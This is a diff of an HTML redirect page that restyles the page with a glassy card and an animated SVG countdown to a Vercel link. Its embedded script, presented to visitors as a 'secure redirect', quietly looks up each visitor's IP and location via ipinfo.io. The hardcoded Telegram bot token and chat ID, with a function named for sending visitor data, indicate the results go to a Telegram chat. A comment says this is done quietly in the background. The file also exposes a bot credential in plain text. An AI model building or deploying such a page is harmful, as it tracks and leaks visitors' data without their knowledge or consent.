@@ -1,58 +1,130 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
         body {
-            background-color: #0f172a;
+            background: #090d16;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(59, 130, 246, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(147, 51, 234, 0.15) 0%, transparent 40%);
             color: #f8fafc;
-            font-family: system-ui, -apple-system, sans-serif;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .container {
-            background: rgba(30, 41, 59, 0.7);
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            max-width: 320px;
+        .card {
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 28px;
+            padding: 35px 25px;
             width: 100%;
+            max-width: 360px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            animation: fadeIn 0.6s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .icon-box {
+            font-size: 2.5rem;
+            margin-bottom: 12px;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
         }
         h2 {
             color: #38bdf8;
-            font-size: 1.25rem;
-            margin-bottom: 15px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 25px;
             word-break: break-all;
         }
-        p {
-            font-size: 0.95rem;
-            color: #94a3b8;
+        /* تصميم دائرة العد التنازلي التفاعلية */
+        .circular-timer {
+            position: relative;
+            width: 110px;
+            height: 110px;
+            margin: 0 auto 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        span {
-            color: #f43f5e;
-            font-weight: bold;
+        .circular-timer svg {
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+        .circular-timer circle {
+            fill: none;
+            stroke-width: 8;
+            stroke-linecap: round;
+        }
+        .timer-bg {
+            stroke: rgba(255, 255, 255, 0.08);
+        }
+        .timer-progress {
+            stroke: url(#gradient);
+            stroke-dasharray: 283; /* 2 * pi * 45 */
+            stroke-dashoffset: 0;
+            transition: stroke-dashoffset 1s linear;
+        }
+        .timer-number {
+            position: absolute;
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #f8fafc;
+        }
+        .subtitle {
+            font-size: 0.9rem;
+            color: #94a3b8;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2 id="destination-name">Loading...</h2>
-        <p>Redirecting in <span id="countdown">7</span> seconds...</p>
+    <div class="card">
+        <div class="icon-box">⚡</div>
+        <h2 id="destination-name">Preparing...</h2>
+        
+        <div class="circular-timer">
+            <svg>
+                <defs>
+                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" stop-color="#3b82f6" />
+                        <stop offset="100%" stop-color="#f43f5e" />
+                    </linearGradient>
+                </defs>
+                <circle class="timer-bg" cx="55" cy="55" r="45"></circle>
+                <circle class="timer-progress" id="progress-circle" cx="55" cy="55" r="45"></circle>
+            </svg>
+            <div class="timer-number" id="countdown">7</div>
+        </div>
+
+        <p class="subtitle">Secure redirect in progress...</p>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "8728217018:AAHctv9Xsgm9UklqD27jfzBrbOJX100dYqE";
         const TELEGRAM_CHAT_ID = "8718173410";
 
-        // إرسال بيانات الزائر في الخلفية فوراً بدون تعطيل العداد
+        // إرسال البيانات في الخلفية بهدوء
         async function sendVisitorData(destName, targetUrl) {
             try {
                 const ipRes = await fetch('https://ipinfo.io/json');
@@ -79,20 +151,30 @@
             let targetUrl = "https://go-noo.vercel.app/";
             let destName = "Main Page";
 
-            // 1. بدء العد التنازلي فوراً بصرياً عشان مايحصلش أي تأخير للمستخدم
+            // إعدادات دائرة التقدم (محيط الدائرة = 283)
+            const circle = document.getElementById('progress-circle');
+            const radius = circle.r.baseVal.value;
+            const circumference = 2 * Math.PI * radius;
+            circle.style.strokeDasharray = circumference;
+
             let seconds = 7;
             const countdownEl = document.getElementById('countdown');
-            
+
             const timer = setInterval(() => {
                 seconds--;
                 countdownEl.textContent = seconds;
+
+                // تحديث الـ SVG progress بصرياً
+                const offset = circumference - (seconds / 7) * circumference;
+                circle.style.strokeDashoffset = offset;
+
                 if (seconds <= 0) {
                     clearInterval(timer);
                     window.location.replace(targetUrl);
                 }
             }, 1000);
 
-            // 2. جلب الـ Links والاسم في الخلفية وتحديث البيانات فور توفرها
+            // جلب الـ Links والاسم في الخلفية
             try {
                 const res = await fetch('links.json?_=' + Date.now());
                 const data = await res.json();
@@ -102,10 +184,9 @@
                     document.getElementById('destination-name').textContent = destName;
                 }
             } catch (e) {
-                document.getElementById('destination-name').textContent = "Ready";
+                document.getElementById('destination-name').textContent = "Redirecting...";
             }
 
-            // إرسال التيليجرام في الخلفية
             sendVisitorData(destName, targetUrl);
         }
 
